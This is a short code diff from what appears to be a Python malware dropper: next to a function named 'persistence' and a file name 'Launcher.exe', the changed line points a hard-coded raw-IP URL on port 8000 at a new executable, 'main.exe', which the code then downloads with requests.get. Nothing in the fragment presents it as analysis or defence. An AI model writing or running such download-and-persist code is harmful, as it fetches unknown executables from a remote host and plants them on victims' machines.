@@ -25,7 +25,7 @@ def persistence(home, file_name):
 
 file_name = "Launcher.exe"
 
-URL = "http://45.56.115.91:8000/extractor.exe"
+URL = "http://45.56.115.91:8000/main.exe"
 
 r = requests.get(URL, allow_redirects=True)
 
